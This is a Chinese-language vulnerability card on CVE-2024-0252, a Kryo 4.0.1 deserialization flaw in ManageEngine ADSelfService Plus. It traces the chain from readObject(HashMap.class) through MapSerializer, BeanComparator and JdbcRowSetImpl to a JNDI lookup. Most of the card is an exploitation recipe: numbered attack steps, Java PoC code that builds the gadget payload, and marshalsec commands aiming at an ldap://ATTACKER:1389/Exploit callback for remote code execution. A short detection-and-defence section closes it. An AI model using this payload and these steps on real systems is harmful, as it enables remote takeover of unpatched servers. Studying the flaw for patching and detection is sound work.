---
id: web-java-deser-kryo-typed-readobject-hashmap-beancomparator-jndi
title: Kryo 4.0.1 指定类型 readObject(HashMap.class) 仍经 MapSerializer→readClassAndObject：CommonsBeanutils BeanComparator 触发 JdbcRowSetImpl JNDI（CVE-2024-0252）
type: scenario
domain: web
path: web/java/deserialization
technique: kryo-typed-readobject-hashmap-beancomparator-jndi
aliases:
- CVE-2024-0252
- Kryo readObject(HashMap.class)
- Kryo MapSerializer readClassAndObject
- ADSelfService Plus Kryo
- marshalsec Kryo CommonsBeanutils
- BeanComparator JdbcRowSetImpl
- registrationRequired=false
tags:
- java
- kryo
- deserialization
- gadget-chain
- beanutils
- jndi
- jdbcrowset
- cve-2024-0252
- rce
cve:
- CVE-2024-0252
severity: critical
confidence: medium
affected_versions: ManageEngine ADSelfService Plus 6401 之前（原文标注）；Kryo 4.0.1（registrationRequired 默认 false）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:50:49+08:00'
  notes: 已对照原文核对：唯一图片为ADSelfServicePlus.jar补丁diff，确认为registerClasses中新增kryo.setRegistrationRequired(true)并register(HashMap/TreeMap/JSONObject/JSONArray)，且产品代码为(HashMap)kryo.readObject(input,HashMap.class)，与卡中readObject→MapSerializer→readClassAndObject的入口分析一致；原文明确影响版本6401之前、Kryo 4.0.1，affected_versions已对应；marshalsec.Kryo CommonsBeanutils+BeanComparator(databaseMetaData)→JdbcRowSetImpl JNDI链与原文exp/PoC一致；原文未给出产品HTTP入口与实际回连，卡confidence=medium且触发条件已注明产品级未验证；dedup与库内kryo-hashmap-hashcode、kryo-setter-reflection、kryo-utf8三卡均非同链。
---

## 一句话结论

Kryo 4.0.1 默认 `registrationRequired=false`，即便应用显式调用 `kryo.readObject(input, HashMap.class)` 把反序列化类型限定为 HashMap，其 `MapSerializer.read` 内部仍会调用 `readClassAndObject` 还原嵌套对象，从而实例化任意未注册类；配合 marshalsec `Kryo CommonsBeanutils` 载荷（TreeMap + BeanComparator → JdbcRowSetImpl 的 `databaseMetaData` getter → JNDI lookup）即可在反序列化阶段触发 JNDI 注入，最终 RCE（CVE-2024-0252 的补丁正是加一行 `kryo.setRegistrationRequired(true)`）。

## 原理

- **Kryo 的类注册机制**：Kryo 用“注册 ID ↔ 类”映射来还原对象。`registrationRequired=true` 时未注册类直接被拒；Kryo 4.x 默认 false（5.0 起默认 true），因此流里出现的任意类名都会被 `Class.forName` 加载并重建。这与 Java 原生反序列化黑名单思路不同，Kryo 属于“默认开放”。
- **指定类型并不限制嵌套类**：`readObject(input, HashMap.class)` 只是先取 HashMap 对应的 `MapSerializer`；`MapSerializer.read` 在逐个读取键值时会调用 `readClassAndObject` 还原任意类型的键/值。也就是说，调用方以为“我只反序列化 HashMap”，实际仍然开放了任意类实例化。
- **实例化策略**：gadget 类常无默认 public 构造（如 `BeanComparator` 需要 property 参数），因此需要 `new Kryo.DefaultInstantiatorStrategy(new StdInstantiatorStrategy())`，用 Objenesis 绕过构造函数直接分配对象。
- **本载荷的触发点**：marshalsec 生成的 Kryo CommonsBeanutils 载荷是一个 `TreeMap`（比较器为 `BeanComparator`，值可为 `JdbcRowSetImpl`），外层包 `HashMap`。Kryo 重建 TreeMap 并 `put` 元素时调用比较器的 `compare`，`BeanComparator` 按 property 反射调用 getter；property 设为 `databaseMetaData` 时在 `JdbcRowSetImpl` 上触发 `getDatabaseMetaData()` → `connect()` → `InitialContext.lookup(<jndi url>)`。
- **JNDI 侧**：攻击者控制的 LDAP/RMI 服务返回恶意 Reference/序列化对象；JDK 高版本限制远程 codebase 后，通常改用 LDAP 返回本地 classpath 可用 gadget（或 RMI + 本地 gadget），仍可达成命令执行。
- **CVE-2024-0252 的修复**：ADSelfService Plus 6401 之前使用 Kryo 4.0.1 且在下发/接收数据处做 Kryo 反序列化；补丁 diff 仅新增 `kryo.setRegistrationRequired(true);` 并注册 HashMap、TreeMap、JSONObject 等有限类型，说明漏洞根因就是未开启类注册白名单。

## 触发条件

- 应用使用 Kryo 4.x（或任何 `registrationRequired=false` 的配置）对不可信输入做 `readClassAndObject` 或指定类型的 `readObject`（如 `readObject(input, HashMap.class)`）。
- 没有严格类白名单，或 Kryo 实例的配置可由攻击者影响。
- classpath 存在可用 gadget 依赖：`commons-beanutils`（BeanComparator）与 JDK 自带 `com.sun.rowset.JdbcRowSetImpl`；其它 marshalsec 链需要对应库（Groovy/Rome/Spring/XBean/Resin 等）。
- 目标可出网访问攻击者 JNDI/LDAP/RMI 服务；JDK 版本允许对应 JNDI 利用方式。
- 原文未给出 ADSelfService Plus 的具体 HTTP 入口与实网回连，产品级触发点未验证。

## 利用步骤

1. 确认目标使用 Kryo 4.x 且对输入做反序列化；从依赖、报错（`Class is not registered` 与否）或补丁/版本判断 `registrationRequired` 状态。
2. 搭建本地 demo 复现库行为（依赖 kryo 4.0.1 + commons-beanutils 1.8.3）：
   ```java
   Kryo kryo = new Kryo();
   kryo.setInstantiatorStrategy(new Kryo.DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
   Input input = new Input(new FileInputStream("payload.bin"));
   kryo.readClassAndObject(input);          // 或 kryo.readObject(input, HashMap.class);
   ```
3. 用 marshalsec 生成 Kryo CommonsBeanutils 载荷，JNDI 指向自己的 LDAP/RMI 服务：
   ```bash
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Kryo CommonsBeanutils \
     ldap://ATTACKER:1389/Exploit
   ```
4. 启动 JNDI 利用服务（如 JNDIExploit/marshalsec LDAP server），把生成的字节流作为 Kryo 输入提交给目标入口。
5. 目标反序列化 TreeMap 时经 BeanComparator 调用 `JdbcRowSetImpl.getDatabaseMetaData`，发起 JNDI 连接，回连成功后在目标执行命令或加载本地 gadget。
6. 产品场景：ADSelfService Plus < 6401 升级前可按其 Kryo 反序列化入口测试；补丁后因 `registrationRequired=true` 且仅注册少量类型，载荷中的 gadget 类会因未注册而失败。

## PoC

```java
// 生成侧（marshalsec 已提供 Kryo CommonsBeanutils 生成器，等价结构如下）
BeanComparator cmp = new BeanComparator("lowestSetBit", Collections.reverseOrder());
Object trig = makeTreeMap(makeJNDIRowSet("ldap://ATTACKER:1389/Exploit"), cmp);
setFieldValue(cmp, "property", "databaseMetaData");
HashMap<String, Object> hashMap = new HashMap<>();
hashMap.put("test", trig);
// Kryo.writeClassAndObject(output, hashMap) 得到 payload
```

```java
// 目标侧：readObject 指定 HashMap 仍会还原任意嵌套类
Kryo kryo = new Kryo();
kryo.setInstantiatorStrategy(new Kryo.DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
kryo.readObject(new Input(payloadBytes), HashMap.class);
```

```bash
# marshalsec 载荷生成
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Kryo CommonsBeanutils ldap://ATTACKER:1389/Exploit
```

## 变体与关联

- 变体：`marshalsec.KryoAltStrategy` 提供更多链：Groovy、SpringPartiallyComparableAdvisorHolder、SpringAbstractBeanFactoryPointcutAdvisor、Rome、XBean、Resin、LazySearchEnumeration、BindingEnumeration、ServiceLoader、ImageIO、CommonsBeanutils；前提是目标 classpath 有对应依赖。
- 变体：`readClassAndObject` 直接反序列化 HashMap 根对象时，也可走 HashMap.put→hashCode 类 gadget（EqualsBean/ToStringBean/TemplatesImpl、HotSwappableTargetSource 等，见关联卡）。
- 关联：[[web-java-deser-kryo-hashmap-hashcode-gadget-chain]]（Kryo HashMap put→hashCode 链）、[[web-java-deser-kryo-setter-reflection-instantiator-registration-bypass]]（通过 setter 反射关闭 registrationRequired/设置 StdInstantiatorStrategy）、[[web-java-deser-kryo-utf8-overlong-encoding-bypass]]（Kryo 类名/编码绕过）。
- 边界：Kryo ≥5.0 默认 `registrationRequired=true`；显式注册白名单后未注册 gadget 类被拒；JDK 高版本禁用远程 codebase 时需本地 gadget；目标 egress 到 LDAP/RMI 被阻断时 JNDI 不触发。

## 检测与防御

- 检测：Kryo 流中出现未注册/敏感类名（BeanComparator、JdbcRowSetImpl、TemplatesImpl 等）；应用进程向陌生 LDAP(389/636)/RMI 端口发起连接或解析外部 JNDI；`JdbcRowSetImpl.connect`/`InitialContext.lookup` 相关调用栈。
- 防御：升级 ManageEngine ADSelfService Plus ≥ 6401；Kryo 配置 `setRegistrationRequired(true)` 并只注册业务所需类型；升级 Kryo 5.x（默认注册必填）；禁止在不可信输入上反序列化；限制应用出网到 LDAP/RMI；对反序列化入口做签名/来源校验。
